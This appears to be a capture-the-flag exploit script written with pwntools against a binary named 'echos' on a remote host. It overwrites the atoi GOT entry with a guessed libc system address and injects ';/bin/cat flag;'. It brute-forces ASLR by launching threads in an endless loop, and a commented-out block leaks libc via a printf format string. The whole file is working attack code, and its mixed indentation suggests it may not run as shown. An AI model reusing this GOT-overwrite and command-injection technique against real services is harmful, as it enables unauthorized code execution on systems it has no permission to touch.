#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64
import time
import threading

__LIBC__ = "./libc-2.23.so"
__NAME__ = "echos"
__REMOTE__ = "10.66.20.180"
__REMOTE_PORT__ = 3000
#__REMOTE__ = "localhost"
#__REMOTE_PORT__ = 9999
__ASLR__ = args.ASLR
__GDB__ = """
b * 0x8048752
set follow-fork-mode child
c
"""

libc = ELF(__LIBC__)
elf = ELF("./echos")

context.arch = 'amd64'
#context.log_level = 'debug'

def worker():
        log.info("[+] pwning %s"  % __NAME__)
	if 1:
		log.info("[+] remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("[+] local run")

		if args.GDB:
			if args.GDB == 'attach':
				r = process("./%s" % __NAME__,
					env={'LD_PRELOAD': __LIBC__},
					aslr=__ASLR__)
				log.info("[~] attaching gdb...")
				gdb.attach(r.pid, __GDB__)

			else:
				r = gdb.debug("./%s" % __NAME__,
					__GDB__,
					env={'LD_PRELOAD': __LIBC__},
					aslr=__ASLR__)
		else:
			r = process("./%s" % __NAME__,
				env={'LD_PRELOAD': __LIBC__},
				aslr=__ASLR__)
        #"""
        rop_ret = 0x08048436
	size = 0x804b000 - elf.got['atoi']
	r.sendline("%d" % (size))
        payload = p32(0xf75c0000 + libc.symbols['system']) + ('9' * (size - 4))
	r.send(payload)
        r.sendline(";/bin/cat flag;")
	r.recvline()
        result = r.recv(timeout=1.0)
        if result:
                print("!" * 100)
                print("!" * 100)
                print("!" * 100)
                print(result)
                result = r.recv(timeout=0.1)
                print(result)
                result = r.recv(timeout=0.1)
                print(result)
        r.close()
        """
        rop_ret = 0x08048436
	size = 0x804b000 - elf.got['atoi']
	r.sendline("%d" % (size))
        payload = p32(elf.plt["printf"]) + ('9' * ((size - 4)))
	r.send(payload)
	r.sendline('%27$p\n%w')
        r.recvline()
        result = r.recv()
        libc_base = int(result[1:], 16) - libc.symbols["__libc_start_main"] - 0xf7
        print("libc base = " + hex(libc_base))
	r.interactive()
        #"""

while True:
        th = threading.Thread(target=worker, args=())
        th.start()
        time.sleep(0.1)
